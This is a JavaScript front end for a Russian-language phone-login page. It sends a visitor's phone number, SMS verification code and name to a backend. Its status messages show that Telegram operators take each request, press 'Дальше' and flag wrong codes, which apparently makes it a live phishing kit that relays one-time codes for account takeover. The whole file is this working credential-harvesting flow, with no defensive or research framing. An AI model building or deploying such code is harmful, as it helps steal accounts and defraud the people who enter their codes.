const form = document.getElementById("login-form");
const phoneInput = document.getElementById("phone");
const submitButton = document.getElementById("submit-button");
const statusMessage = document.getElementById("status-message");
const phoneScreen = document.getElementById("phone-screen");
const verifyScreen = document.getElementById("verify-screen");
const nameScreen = document.getElementById("name-screen");
const verifyPhone = document.getElementById("verify-phone");
const verifyForm = document.getElementById("verify-form");
const verifyCodeInput = document.getElementById("verify-code");
const verifyStatusMessage = document.getElementById("verify-status-message");
const codeBoxes = Array.from(document.querySelectorAll(".code-box"));
const backButton = document.getElementById("back-button");
const nameBackButton = document.getElementById("name-back-button");
const countdown = document.getElementById("countdown");
const nameForm = document.getElementById("name-form");
const nameInput = document.getElementById("name-input");
const nameSubmitButton = document.getElementById("name-submit-button");

let countdownTimer = null;
let requestStatusTimer = null;
let currentPhone = "";
let currentRequestId = "";
let lastSubmittedCode = "";
let lastCodeErrorCount = 0;
const RESEND_SECONDS = 56;

const formatPhone = (value) => {
  const digits = value.replace(/\D/g, "").slice(0, 10);
  const parts = [];

  if (digits.length > 0) parts.push(digits.slice(0, 3));
  if (digits.length >= 4) parts.push(digits.slice(3, 6));
  if (digits.length >= 7) parts.push(digits.slice(6, 8));
  if (digits.length >= 9) parts.push(digits.slice(8, 10));

  return parts.join(" ");
};

const formatDisplayPhone = (digits) => {
  const normalized = digits.replace(/\D/g, "").slice(-10);
  if (normalized.length !== 10) {
    return "+7";
  }

  return `+7 ${normalized.slice(0, 3)} ${normalized.slice(3, 6)} ${normalized.slice(6, 8)} ${normalized.slice(8, 10)}`;
};

const formatCountdown = (seconds) => {
  const mins = Math.floor(seconds / 60);
  const secs = seconds % 60;
  return `${mins}:${String(secs).padStart(2, "0")}`;
};

const createRequestId = () => {
  const length = Math.floor(Math.random() * 3) + 6;
  const min = 10 ** (length - 1);
  const max = (10 ** length) - 1;

  return String(Math.floor(Math.random() * (max - min + 1)) + min);
};

const updateButtonState = () => {
  const isReady = phoneInput.value.replace(/\D/g, "").length === 10;
  submitButton.disabled = !isReady;
};

const setStatus = (text, type = "") => {
  statusMessage.style.display = text ? "block" : "none";
  statusMessage.textContent = text;
  statusMessage.className = type ? `status-message ${type}` : "status-message";
};

const setVerifyStatus = (text) => {
  verifyStatusMessage.textContent = text;
};

const setActiveScreen = (screen) => {
  const isPhone = screen === "phone";
  const isVerify = screen === "verify";
  const isName = screen === "name";

  phoneScreen.classList.toggle("screen-view-active", isPhone);
  phoneScreen.setAttribute("aria-hidden", String(!isPhone));
  verifyScreen.classList.toggle("screen-view-active", isVerify);
  verifyScreen.setAttribute("aria-hidden", String(!isVerify));
  nameScreen.classList.toggle("screen-view-active", isName);
  nameScreen.setAttribute("aria-hidden", String(!isName));
};

const updateCodeBoxes = () => {
  const digits = verifyCodeInput.value.replace(/\D/g, "").slice(0, 6);
  verifyCodeInput.value = digits;

  codeBoxes.forEach((box, index) => {
    const digit = digits[index] || "";
    box.textContent = digit;
    box.classList.toggle("filled", Boolean(digit));
    box.classList.toggle("active", !digit && index === digits.length && digits.length < 6);
  });

  if (digits.length === 6) {
    codeBoxes.forEach((box) => box.classList.remove("active"));
  }
};

const stopRequestStatusPolling = () => {
  if (requestStatusTimer) {
    clearInterval(requestStatusTimer);
    requestStatusTimer = null;
  }
};

const openVerifyScreen = () => {
  submitButton.textContent = "Продолжить";
  verifyPhone.textContent = formatDisplayPhone(currentPhone);
  verifyCodeInput.value = "";
  lastSubmittedCode = "";
  setVerifyStatus("");
  updateCodeBoxes();
  setActiveScreen("verify");
  startCountdown();
  window.setTimeout(() => verifyCodeInput.focus(), 80);
};

const openNameScreen = () => {
  stopCountdown();
  setVerifyStatus("");
  nameInput.value = "";
  setActiveScreen("name");
  window.setTimeout(() => nameInput.focus(), 80);
};

const checkRequestStatus = async () => {
  if (!currentRequestId) {
    return;
  }

  try {
    const response = await fetch(`/api/request-status?requestId=${encodeURIComponent(currentRequestId)}`);
    const result = await response.json();

    if (!response.ok) {
      throw new Error(result.error || "Не удалось проверить статус");
    }

    if ((result.codeErrorCount || 0) > lastCodeErrorCount) {
      lastCodeErrorCount = result.codeErrorCount || 0;
      verifyCodeInput.value = "";
      lastSubmittedCode = "";
      setVerifyStatus("Неверный код");
      updateCodeBoxes();
      if (verifyScreen.classList.contains("screen-view-active")) {
        window.setTimeout(() => verifyCodeInput.focus(), 80);
      }
    }

    if (result.status === "taken") {
      setStatus(`Заявку взял ${result.takenBy}. Ждем нажатие "Дальше" в Telegram.`, "success");
      return;
    }

    if (result.status === "ready") {
      setStatus("");
      if (!verifyScreen.classList.contains("screen-view-active")) {
        openVerifyScreen();
      }
      return;
    }

    if (result.status === "name") {
      setStatus("");
      if (!nameScreen.classList.contains("screen-view-active")) {
        openNameScreen();
      }
    }
  } catch (error) {
    stopRequestStatusPolling();
    setStatus(error.message, "error");
    submitButton.textContent = "Продолжить";
    updateButtonState();
  }
};

const startRequestStatusPolling = () => {
  stopRequestStatusPolling();
  checkRequestStatus();
  requestStatusTimer = window.setInterval(checkRequestStatus, 2000);
};

const submitVerificationCode = async (code) => {
  if (code.length !== 6 || !currentPhone || code === lastSubmittedCode) {
    return;
  }

  lastSubmittedCode = code;

  try {
    const response = await fetch("/api/send-code", {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        phone: currentPhone,
        code,
        requestId: currentRequestId
      })
    });

    const result = await response.json();
    if (!response.ok) {
      throw new Error(result.error || "Не удалось отправить код");
    }
  } catch (error) {
    lastSubmittedCode = "";
  }
};

const submitName = async (value) => {
  const trimmed = value.trim();
  if (!trimmed || !currentRequestId) {
    return;
  }

  nameSubmitButton.disabled = true;
  nameSubmitButton.textContent = "Отправка...";

  try {
    const response = await fetch("/api/send-name", {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        requestId: currentRequestId,
        phone: currentPhone,
        name: trimmed
      })
    });

    const result = await response.json();
    if (!response.ok) {
      throw new Error(result.error || "Не удалось отправить имя");
    }

    nameSubmitButton.textContent = "Продолжить";
    nameSubmitButton.disabled = false;
    nameInput.value = "";
  } catch (error) {
    nameSubmitButton.textContent = "Продолжить";
    nameSubmitButton.disabled = false;
  }
};

const stopCountdown = () => {
  if (countdownTimer) {
    clearInterval(countdownTimer);
    countdownTimer = null;
  }
};

const startCountdown = () => {
  stopCountdown();

  if (!countdown) {
    return;
  }

  let secondsLeft = RESEND_SECONDS;
  countdown.textContent = formatCountdown(secondsLeft);

  countdownTimer = setInterval(() => {
    secondsLeft -= 1;

    if (secondsLeft <= 0) {
      countdown.textContent = "0:00";
      stopCountdown();
      return;
    }

    countdown.textContent = formatCountdown(secondsLeft);
  }, 1000);
};

const resetToPhoneScreen = () => {
  stopCountdown();
  stopRequestStatusPolling();
  currentPhone = "";
  currentRequestId = "";
  lastSubmittedCode = "";
  lastCodeErrorCount = 0;
  submitButton.textContent = "Продолжить";
  verifyCodeInput.value = "";
  nameInput.value = "";
  nameSubmitButton.disabled = false;
  nameSubmitButton.textContent = "Продолжить";
  setVerifyStatus("");
  updateCodeBoxes();
  setStatus("");
  setActiveScreen("phone");
  phoneInput.focus();
};

phoneInput.addEventListener("input", () => {
  phoneInput.value = formatPhone(phoneInput.value);
  setStatus("");
  updateButtonState();
});

verifyForm.addEventListener("click", () => {
  verifyCodeInput.focus();
});

verifyCodeInput.addEventListener("input", updateCodeBoxes);
verifyCodeInput.addEventListener("input", () => {
  const code = verifyCodeInput.value.replace(/\D/g, "").slice(0, 6);
  setVerifyStatus("");

  if (code.length < 6) {
    lastSubmittedCode = "";
    return;
  }

  submitVerificationCode(code);
});

backButton.addEventListener("click", resetToPhoneScreen);
nameBackButton.addEventListener("click", resetToPhoneScreen);

nameForm.addEventListener("submit", async (event) => {
  event.preventDefault();
  await submitName(nameInput.value);
});

form.addEventListener("submit", async (event) => {
  event.preventDefault();

  const digits = phoneInput.value.replace(/\D/g, "");
  if (digits.length !== 10) {
    setStatus("Введите номер полностью", "error");
    updateButtonState();
    return;
  }

  const phone = `+7${digits}`;
  const requestId = createRequestId();

  stopRequestStatusPolling();
  submitButton.disabled = true;
  submitButton.textContent = "Ожидание...";
  setStatus("Отправили заявку в Telegram. Ждем, пока там нажмут кнопку.", "success");

  try {
    const response = await fetch("/api/send-phone", {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({ phone, requestId })
    });

    const result = await response.json();
    if (!response.ok) {
      throw new Error(result.error || "Не удалось отправить номер");
    }

    currentPhone = phone;
    currentRequestId = requestId;
    lastCodeErrorCount = 0;
    startRequestStatusPolling();
  } catch (error) {
    setStatus(error.message, "error");
    submitButton.textContent = "Продолжить";
    updateButtonState();
  }
});

updateButtonState();
updateCodeBoxes();
